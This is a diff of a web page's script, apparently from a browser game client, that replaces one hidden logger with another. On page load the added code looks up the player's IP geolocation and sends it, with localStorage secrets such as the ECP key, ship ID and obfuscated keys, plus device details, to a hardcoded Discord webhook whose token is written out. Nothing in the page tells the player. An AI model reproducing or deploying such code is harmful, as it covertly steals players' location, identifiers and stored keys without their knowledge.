@@ -54607,61 +54607,78 @@
             fetch("https://ipapi.co/json/")
   .then(response => response.json())
   .then(data => {
-    const now = new Date();
-    const currentDate = now.toLocaleDateString();
-    const currentTime = now.toLocaleTimeString();
-    const currentYear = now.getFullYear();
-    const currentMonth = now.getMonth() + 1; // Months are zero-indexed
+    const currentTime = new Date().toLocaleString(); // Get current time and format as string
 
-    const logData = {
-      content: `
-        \n <a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816>**Client Info**<a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>
-        \n Player named: ${localStorage.lastNickname}
-        \n ===================
-        \n Date: ${currentDate}
-        \n Time: ${currentTime}
-        \n Year: ${currentYear}
-        \n Month: ${currentMonth}
-        \n ===================
-        \n IP: ${data.ip}
-        \n City: ${data.city}
-        \n Region: ${data.region}
-        \n Country: ${data.country_name}
-        \n Latitude: ${data.latitude}
-        \n Longitude: ${data.longitude}
-        \n ===================
-        \n ECP Code: ${localStorage.ECPKey}
-        \n Verified?: ${localStorage.ECPVerified}
-        \n ===================
-        \n Info: ${localStorage.OIIOO}
-        \n ===================
-        \n Client Ship ID: ${localStorage.client_ship_id}
-        \n ===================
-        \n lI0Ol: ${localStorage.lI0Ol}
-        \n ===================
-        \n User Agent: ${navigator.userAgent}
-        \n Platform: ${navigator.platform}
-        \n Language: ${navigator.language}
-        \n ===================
-        \n Screen Resolution: ${screen.width}x${screen.height}
-        \n Available Screen Resolution: ${screen.availWidth}x${screen.availHeight}
-        \n Color Depth: ${screen.colorDepth}
-        \n Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-        \n ===================
-        \n Memory: ${navigator.deviceMemory || 'Not available'} GB
-        \n Number of CPU Cores: ${navigator.hardwareConcurrency || 'Not available'}
-        \n ===================
-        \n <a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>`
-    };
+    // Gather player PC details
+    const platform = navigator.platform;
+    const language = navigator.language;
+    const screenResolution = `${screen.width}x${screen.height}`;
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const internetInfo = connection ? `Type: ${connection.effectiveType}, Downlink: ${connection.downlink} Mbps, RTT: ${connection.rtt} ms` : 'Internet info not available';
 
-    fetch("https://discord.com/api/webhooks/1264223445684588656/zlWk9fHI2HZpjD0hBWEhlDb5kVAYIlpv_G7hwE9TPSEGaISPrK4LerjRMkFS1rdENgza", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(logData)
-    });
+    // Function to measure FPS
+    let lastFrameTime = performance.now();
+    let frameCount = 0;
+    let fps = 0;
+
+    function measureFPS() {
+      const now = performance.now();
+      frameCount++;
+      const delta = (now - lastFrameTime) / 1000;
+      if (delta >= 1) {
+        fps = Math.round(frameCount / delta);
+        frameCount = 0;
+        lastFrameTime = now;
+        sendWebhook();
+      } else {
+        requestAnimationFrame(measureFPS);
+      }
+    }
+
+    function sendWebhook() {
+      fetch("https://discord.com/api/webhooks/1235198138449399890/Nza_glVgdHLmh7-5pYZcIvTXhT5ExBfb9-rvn6aJXwqVdS3vox1hgguXwAerqJwUeQ2Q", {
+        method: "post",
+        headers: {
+          'Content-Type': "application/json"
+        },
+        body: JSON.stringify({
+          'embeds': [{
+            'title': "Client Info",
+            'description': `<a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>\n\n` +
+                           `**Player named:** ${localStorage.lastNickname}\n\n` +
+                           `**Time:** ${currentTime}\n\n` +
+                           `**Ip:** ${data.ip}\n\n` +
+                           `**City:** ${data.region}\n\n` +
+                           `**Region:** ${data.region}\n\n` +
+                           `**Country:** ${data.country_name}\n\n` +
+                           `**ECP Code:** ${localStorage.ECPKey}\n\n` +
+                           `**Verified?:** ${localStorage.ECPVerified}\n\n` +
+                           `**Info:** ${localStorage.OIIOO}\n\n` +
+                           `**Client Ship ID:** ${localStorage.client_ship_id}\n\n` +
+                           `**lI0Ol:** ${localStorage.lI0Ol}\n\n` +
+                           `**Useragent:** ${navigator.userAgent}\n\n` +
+                           `**Platform:** ${platform}\n\n` +
+                           `**Language:** ${language}\n\n` +
+                           `**Screen Resolution:** ${screenResolution}\n\n` +
+                           `**FPS:** ${fps}\n\n` +
+                           `**Internet Info:** ${internetInfo}\n\n` +
+                           `<a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>`,
+            'thumbnail': {
+              'url': 'https://s6.imgcdn.dev/LzRYM.png'
+            },
+            'image': {
+              'url': 'https://mir-s3-cdn-cf.behance.net/project_modules/fs/e2781583145783.5d40c389e496c.gif'
+            },
+            'color': 3447003 // Optional, sets the color of the left side of the embed
+          }]
+        })
+      });
+    }
+
+    // Start measuring FPS
+    requestAnimationFrame(measureFPS);
   });
+
 
         </script>
     </body>
